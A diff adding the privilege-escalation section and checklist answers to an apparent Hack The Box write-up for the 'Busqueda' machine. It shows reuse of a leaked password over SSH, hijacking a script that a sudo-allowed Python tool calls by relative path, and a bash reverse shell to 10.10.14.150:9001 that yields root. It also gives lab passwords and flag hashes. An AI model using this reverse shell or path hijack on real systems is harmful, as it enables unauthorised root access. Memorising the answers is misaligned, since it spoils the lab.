@@ -106,6 +106,54 @@ To find the user.txt flag, we visit the home directory and print out the user.tx
 
 # Privilege Escalation
 
+After file hunting on the machine we find a .git file containing a username and password for "Cody" on a gitea page:
+
+![](Pasted%20image%2020260714151457.png)
+
+Logging into the machine with this password allows us to gain access to the "svc" user account:
+
+		ssh svc@10.129.36.88 
+
+		password: jh1usoih2bkjaspwe92
+
+
+From a sudo perspective, the "svc" account is only allowed to run the below commands:
+
+		/usr/bin/python3 opt/scripts/system-checkup.py *
+
+
+After running the above command, we find there are multiple options for this command including 
+- list running docker containers
+- inspect docker containers
+- full system checkup on containers
+
+We would like to verify the available machines and the information on them:
+
+![697](Pasted%20image%2020260714161154.png)
+
+Using a JSON format for the code we are able to review the available DOCKER machines and find a Gitea Password on the gitea container:
+
+![](Pasted%20image%2020260714162757.png)
+
+
+Using the password we can now login to the Administrator Gitea account!
+
+
+The Gitea Account shows that the full-checkup.sh file is being called directly within the /opt/scripts directory. 
+
+Using this to my advantage we can create a temporary reverse shell file named, "full_checkup.sh" in the /tmp directory and have the file include a reverse bash shell:
+
+![](Pasted%20image%2020260714180057.png)
+
+Full-Checkup.sh:
+
+	#! /bin/bash
+	bash -i >& /dev/tcp/10.10.14.150/9001 0>&1
+
+
+After running, we received a root shell with the final flag!!
+
+![](Pasted%20image%2020260714180317.png)
 
 
 ## HTB Question Checklist
@@ -130,6 +178,25 @@ To find the user.txt flag, we visit the home directory and print out the user.tx
 5) Submit the flag located in the svc user's home directory.
 
 	dd60f8da363ef209c228ab8df96e5fdc
+
+6) What is the password for cody user present on Busqueda?
+
+	jh1usoih2bkjaspwe92
+
+7) What is the full path of the Python script can be run with root privileges by the svc user on the box?
+
+	/opt/scripts/system-checkup.py
+
+8) What is the password for the administrator user on the Gitea application?
+
+	yuiu1hoiu4i5ho1uh
+
+9) What is the name of the script that is called by `system-checkup.py` using a relative path?
+
+10) Submit the flag located in the root user's home directory.
+
+	49e23394ef13e028089c7773a1323ab7
+
 
 
 
